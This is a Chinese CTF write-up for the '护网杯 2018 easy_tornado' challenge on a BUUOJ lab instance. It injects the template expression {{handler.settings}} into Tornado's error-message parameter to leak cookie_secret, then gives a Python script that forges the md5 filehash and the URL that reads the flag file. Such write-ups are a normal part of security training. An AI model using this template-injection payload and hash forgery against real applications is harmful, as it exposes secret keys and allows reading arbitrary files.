### [护网杯 2018]easy_tornado

----

```python
/flag.txt
flag in /fllllllllllllag

/welcome.txt
render

/hints.txt
md5(cookie_secret+md5(filename))
```

我们已经有了整体的思路，现在要做的就是寻找`cookie_secret`，同时我贴一下url格式：

```
http://43d5032b-3241-4fa1-b247-3a2f8bf407bb.node5.buuoj.cn:81/file?filename=/flag.txt&filehash=32f696e969936edbd879e9a7862f4b42
```

我们可以修改任意值，发现报错

```
http://43d5032b-3241-4fa1-b247-3a2f8bf407bb.node5.buuoj.cn:81/error?msg=Error
```

根据题目我们一开始可以判断应该是模板注入类型题目：

之前的注入手段不行，我们这里采用tornado中特殊参数去查看cookie_secert

`{{handler.application.settings}}`或者`{{handler.settings}}`

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '8e0ec61c-e16c-4ed2-a4ca-f51cd96f3efe'}
```



编写脚本得到hash值：

```python
import hashlib
def md5_encode(data):
    md5_hash = hashlib.md5()
    md5_hash.update(data.encode('utf-8'))
    md5_digest = md5_hash.hexdigest()
    return md5_digest

#md5(cookie_secret+md5(filename))
cookie_secert = "8e0ec61c-e16c-4ed2-a4ca-f51cd96f3efe"
res = md5_encode(cookie_secert+md5_encode("/fllllllllllllag"))
print(res)
#f7e4762bc050ad45ad778474c05eb310
```

最后访问：

```
http://43d5032b-3241-4fa1-b247-3a2f8bf407bb.node5.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=f7e4762bc050ad45ad778474c05eb310
```

得到flag!!!